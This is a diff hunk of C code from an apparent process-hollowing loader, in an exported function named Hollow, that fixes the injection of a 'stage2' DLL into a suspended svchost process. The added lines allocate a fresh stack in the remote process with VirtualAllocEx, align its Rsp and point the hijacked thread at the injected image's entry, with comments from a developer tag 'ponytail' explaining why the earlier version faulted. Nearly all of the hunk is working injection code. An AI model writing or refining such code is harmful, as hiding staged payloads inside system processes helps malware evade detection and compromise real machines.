@@ -356,6 +356,25 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     ctx.Rcx = (DWORD64)remoteImage;
     ctx.Rdx = (DWORD64)DLL_PROCESS_ATTACH;
     ctx.R8  = (DWORD64)0;
+    // ponytail: allocate a fresh 16-byte-aligned stack in the remote process.
+    // The suspended thread's Rsp came from svchost's OS-spawn entry point —
+    // it's not aligned for an imaginary "call DllEntry" (Win64 requires Rsp
+    // ≡ 8 mod 16 at function entry, i.e. 16-aligned before the call's push).
+    // Modern kernel32/user32 hot paths use movaps on locals; misaligned Rsp
+    // faults silently before stage2's first LogMessage can write — the
+    // symptom we see: "Hollow() complete" then ZERO stage2 lines.
+    // 4KB committed page, Rsp = top - 0x40 (32-byte shadow + 8 misalign+pop).
+    SIZE_T stackSize = 0x1000;
+    LPVOID remoteStack = VirtualAllocEx(pi.hProcess, NULL, stackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remoteStack) {
+        ctx.Rsp = (DWORD64)((LPBYTE)remoteStack + stackSize - 0x40);
+        // ponytail: align Rsp so that (Rsp mod 16) == 8 (post-call invariant)
+        ctx.Rsp &= ~(DWORD64)0xF;
+        ctx.Rsp |= 0x8;
+        LogMessage(L"[+] fresh remote stack allocated and aligned");
+    } else {
+        LogMessage(L"[*] remote stack alloc failed — keeping original Rsp");
+    }
     // ponytail: prefer stage2's exported DllEntry (skips MinGW's _DllMainCRTStartup
     // wrapper, whose CRT init faults in a hand-hollowed process and never reached
     // DllMain). Falls back to AddressOfEntryPoint (the CRT wrapper) when DllEntry
